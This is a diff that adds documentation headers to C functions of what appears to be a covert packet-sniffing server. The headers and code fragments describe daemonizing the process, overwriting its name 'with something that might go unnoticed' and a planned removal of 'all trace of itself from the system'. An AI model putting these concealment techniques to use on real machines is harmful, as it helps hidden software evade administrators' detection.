@@ -207,6 +207,23 @@ int parse_options(int argc, char *argv[])
 	return ERROR_NONE;
 }
 
+/*-----------------------------------------------------------------------------
+ * FUNCTION:    signal_handler 
+ * 
+ * DATE:        June 4, 2010
+ * 
+ * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * INTERFACE:   signal_handler(int sig)
+ *                    sig - the signal that caught the handler
+ * 
+ * RETURNS:     void
+ * 
+ * NOTES: Enables graceful termination of the program.
+ *
+ *----------------------------------------------------------------------------*/
 void signal_handler(int sig)
 {
 	switch(sig) {
@@ -231,6 +248,24 @@ void signal_handler(int sig)
 	}
 }
 
+/*-----------------------------------------------------------------------------
+ * FUNCTION:    exit_clean 
+ * 
+ * DATE:        June 4, 2010
+ * 
+ * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * INTERFACE:   exit_clean(void)
+ * 
+ * RETURNS:     void
+ * 
+ * NOTES: Cleans up open handles, of which there currently are none. However,
+ *        in the future this can be used to allow the program to remove all
+ *        trace of itself from the system.
+ *
+ *----------------------------------------------------------------------------*/
 void exit_clean()
 {
 	if (!svr_vars.daemonize)
@@ -238,6 +273,23 @@ void exit_clean()
 	exit(ERROR_NONE);
 }
 
+/*-----------------------------------------------------------------------------
+ * FUNCTION:    daemonize 
+ * 
+ * DATE:        June 4, 2010
+ * 
+ * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * INTERFACE:   daemonize(void)
+ * 
+ * RETURNS:     void
+ * 
+ * NOTES: Daemonizes the application such that it technically runs as a zombie
+ *        process.
+ *
+ *----------------------------------------------------------------------------*/
 void daemonize()
 {
 	pid_t pid;
@@ -250,6 +302,24 @@ void daemonize()
 		exit(ERROR_NONE);
 }
 
+/*-----------------------------------------------------------------------------
+ * FUNCTION:    mask_process 
+ * 
+ * DATE:        June 4, 2010
+ * 
+ * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * INTERFACE:   mask_process(char *argv[], char *name)
+ *                   argv - initial command used
+ *                   name - new name to mask the process with
+ * 
+ * RETURNS:     void
+ * 
+ * NOTES: Masks the process name with something that might go unnoticed.
+ *
+ *----------------------------------------------------------------------------*/
 void mask_process(char *argv[], char *name)
 {
 	memset(argv[0], 0, strlen(argv[0]));
@@ -257,6 +327,24 @@ void mask_process(char *argv[], char *name)
 	prctl(PR_SET_NAME, name, 0, 0);
 }
 
+/*-----------------------------------------------------------------------------
+ * FUNCTION:    start_server 
+ * 
+ * DATE:        June 4, 2010
+ * 
+ * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * INTERFACE:   start_server(void)
+ * 
+ * RETURNS:     void
+ * 
+ * NOTES: Stats the packet capture loop, looking for communication on a
+ *        a specific port. All packets that match the filter, will be processed
+ *        by the callback function.
+ *
+ *----------------------------------------------------------------------------*/
 void start_server()
 {
 	char *dev = NULL;					/* capture device */
